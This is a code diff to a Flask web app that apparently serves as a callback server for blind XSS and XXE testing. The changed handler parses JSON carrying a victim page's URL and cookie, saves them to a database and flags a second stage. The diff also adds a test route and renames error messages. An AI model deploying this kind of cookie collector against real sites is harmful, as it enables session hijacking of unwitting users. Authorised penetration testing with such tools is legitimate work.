@@ -25,6 +25,11 @@ def root():
 def index():
     return render_template('index.html')
 
+@main.route('/test')
+@login_required
+def test():
+    return render_template('test.html')
+
 # new xss/xxe found, store it inside the db: stage_1
 @main.route(config["main_endpoint"] + '/<path:xxx>/<path:random_str>', methods=['GET'])
 def new_xxx(xxx, random_str):
@@ -96,15 +101,15 @@ def grab_info(xxx_uid):
         content = request.data 
         info = content
         #info = urlsafe_b64decode(content)
-        #info = str(info, "utf-8")
-        #info = json.loads(info)
+        info = str(info, "utf-8")
+        info = json.loads(info)
 
-        xss_uid = xxx_uid
-        url = info["url"]
-        cookie = info["cookie"]
+        xss_uid = str(xxx_uid)
+        url = str(info["url"])
+        cookie = str(info["cookie"])
     except Exception as e:
         print(str(e))
-        print("[-] Error in get_info()")
+        print("[-] Error_1 in get_info()")
         return render_template('index.html')
 
     try:
@@ -112,6 +117,7 @@ def grab_info(xxx_uid):
         if xxx:
             xxx.cookie = cookie
             xxx.url = url
+            xxx.xss_stage_2 = True
             db.session.commit()
 
             return "success"
@@ -120,7 +126,7 @@ def grab_info(xxx_uid):
 
     except Exception as e:
         print(str(e))
-        print("[-] Error in get_info()")
+        print("[-] Error_2 in get_info()")
         return ""
         
 # delete xss/xxe
